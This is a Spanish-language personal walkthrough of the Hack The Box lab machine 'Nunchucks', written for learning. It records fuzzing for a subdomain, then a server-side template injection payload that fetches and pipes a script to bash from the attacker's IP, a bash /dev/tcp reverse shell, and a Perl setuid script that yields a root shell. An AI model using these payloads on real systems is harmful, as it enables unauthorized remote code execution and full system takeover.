---------------------------------maquina nunchukks htb ---- linux 

aprendizajes 

Penetration Tester Level 1
Web
Vulnerability Assessment
Injection
Common Security Controls
NodeJS
Web Site Structure Discovery
SUID Exploitation
Misconfiguration
Server Side Template Injection (SSTI)

------------------------------------


esta maquina es facil entrar en usuario, solo tienes que hacer un fuzzeo intensivo ( metodologia ) 

fuzzeas directorios y tambien subdominios... 

hemos encontrado un subdominio que es store.nunchucks.htb 

y hemos vuelto a fuzzear y no hayamos nada

pero tenemos una ingresion de email para subscribirnos a una pagina que arroja la misma respuesta, es decir
cuando ponemos un correo nos arroja el correo que hemos puesto, por experiencia podemos ver que 
ahi tiene una inyeccion ssti. (Server-Side Template Injection) pero solo podemos hacerlo en burpsuite

cuando metemos el comando {{7+7}} nos devuelve 14 eso quiere decir que es vulnerable. 
lo que hemos buscado es algun comando en payloadsallthethinks 

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd | curl http://10.10.14.57/ | bash')")()}}


hemos tirado ese comando previamente hemos montado un archivo index.html con una reverseshell dentro de bash 

bash -i >& /dev/tcp/10.10.14.57/443 0>&1

y hemos montado un puerto de escucha para recibir dicha reverseshell 

hemos entrado a la maquina como david . 

el tema es que para poder escalar de privilegios hemos hecho un 

getsetuid / -r 2>/dev/null

hemos visto que tenemos el perl pero gtfobins nos ha arrojado un comando que no ha funcionado en la maquina

se el writeup vemos que corre una app por detras que limita los comandos a los usuarios y por lo tanto
no nos ha podido funcionar, la app se llama apparmor y tiene una carpeta en /usr/bin/apparmor.d 
dentro hay un archivo que es usr.bin.armor
que lo que hace es poner las reglas para poder limitar la cosas 

la idea es poder crear un archivo que se ejecute con perl para poder escalar y lo que hemos hecho
es poner el comando que nos a arrojado gtfobins dentro del archivo para poder ejecutarlo 
como root gracias a los permismos setuid

#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"

ese ha sido el interior de archivo, le hemos dado permisos de ejecucion con chmod +x 
y lo hemos ejecutado con ./a.pl 

y listo, hemos obtenido una consola como root. 

sinceramente la escalada de esta maquina se puede hacer con el binario PwnKit y con Polkit 

pero la manera correcta de hacerlo es asi. 


